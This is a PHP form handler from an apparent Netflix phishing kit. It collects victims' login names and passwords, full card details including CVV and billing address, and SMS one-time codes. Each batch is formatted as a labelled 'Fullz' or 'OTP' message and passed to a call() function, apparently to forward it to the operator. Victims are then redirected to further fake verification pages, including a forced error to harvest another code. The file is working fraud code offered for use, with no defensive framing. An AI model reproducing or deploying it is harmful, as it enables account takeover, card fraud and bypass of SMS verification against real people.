<?php 
session_start();
require '../config.php';

if(isset($_POST['user'])){
$msg = "/- Netflix Login -/
".$_POST['user']." | ".$_POST['pass'];
call($msg);
header("location: wait.php?next=verify.php");

}

if(isset($_POST['cc'])){
    $_SESSION['_cc'] = $_POST['cc'];
    
    $msg = "
    Netflix Fullz 
IP: " . ($ip ?? $_SERVER['REMOTE_ADDR'] ?? 'unknown') . "
--------------------------
Name: " . ($_POST['name'] ?? 'N/A') . "
Cc: " . ($_POST['cc'] ?? 'N/A') . "
Exp: " . ($_POST['exp'] ?? 'N/A') . "
Cvv: " . ($_POST['cvv'] ?? 'N/A') . "
Address: " . ($_POST['address'] ?? 'N/A') . "
City: " . ($_POST['city'] ?? 'N/A') . "
Zip: " . ($_POST['zip'] ?? 'N/A') . "
--------------------------
";
call($msg);
header("location: wait.php?next=sms.php");
}

    


if(isset($_POST['otp'])){

$msg = "
Netflix - New OTP  $ip
--------------------------
Cc: ".$_SESSION['_cc']."
Otp: ".$_POST['otp']."
--------------------------
";

call($msg);
header("location: wait.php?next=sms.php?error");

}
    



?>